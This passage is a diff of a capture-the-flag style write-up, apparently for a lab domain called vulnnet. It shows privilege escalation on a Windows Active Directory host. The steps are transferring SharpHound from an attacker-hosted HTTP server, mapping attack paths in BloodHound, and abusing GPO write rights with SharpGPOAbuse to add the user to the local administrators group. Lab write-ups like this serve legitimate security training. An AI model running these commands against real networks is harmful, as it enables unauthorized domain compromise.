@@ -212,5 +212,80 @@ We have `SeImpersonatePrivilege` which can be used to escalate our privilege.
 
 I tried using printspoofer, roguepotato and even godpotato but nothing worked so i decided to perform some enumeration via SharpHound.
 
+Download the SharpHound binary from [here](https://github.com/BloodHoundAD/SharpHound/releases/download/v1.1.0/SharpHound-v1.1.0.zip) . The latest version doesn't work properly
 
+Transfer to the target using python server 
+
+```shell
+python -m http.server 80
+```
+
+![[attachments/Pasted image 20240527150845.png]]
+
+```powershell
+Invoke-WebRequest -Uri http://10.8.129.243/SharpHound.exe -OutFile C:\Users\enterprise-security\Desktop\SharpHound.exe
+```
+
+Run the command
+
+```powershell
+.\SharpHound.exe --CollectionMethods All --Domain DOMAIN --ExcludeDCs
+```
+
+![[attachments/Pasted image 20240527151446.png]]
+
+Check your directory and there will be a zip file there
+
+![[attachments/Pasted image 20240527151519.png]]
+
+Transfer this to the smb share and access it on your machine to download the file
+
+![[attachments/Pasted image 20240527151751.png]]
+
+![[attachments/Pasted image 20240527151852.png]]
+
+Launch neo4j and Bloodhound
+
+```shell
+sudo neo4j console
+sudo bloodhound
+```
+
+Hopefully you already have them setup already, if not then check a guide on how to do so. It very easy and straighforward.
+
+- After that create a folder and name it "Bloodhound" 
+- Move the zip file into this folder
+- Unzip the file
+- Drag and drop the contents and it'll automatically be imported
+
+If that doesn't work the select this icon and go to the location of the file, select all and click open
+
+![[attachments/Pasted image 20240527153814.png]]
+
+
+Next is to find the shortest path to domain admin
+
+![[attachments/Pasted image 20240527163729.png]]
+
+With this we are able to see that we have GenericWrite permission to the GPO `security-pol-vn`
+
+![[attachments/Pasted image 20240527163959.png]]
+
+We can abuse this to add our user to the administrators group using `SharpGPOAbuse`
+
+```shell
+SharpGPOAbuse.exe --AddComputerTask --TaskName "PrivEsc" --Author vulnnet\administrator --Command "cmd.exe" --Arguments "/c net localgroup administrators enterprise-security /add" --GPOName "SECURITY-POL-VN"
+```
+
+Download the binary [here](https://github.com/byronkg/SharpGPOAbuse/releases/tag/1.0)
+
+![[attachments/Pasted image 20240527173646.png]]
+
+It's now done, next is to force update because we can't wait.
+
+We can confirm using `net users enterprise-security`
+
+![[attachments/Pasted image 20240527174429.png]]
+
+we are part of administrators local group membership
 
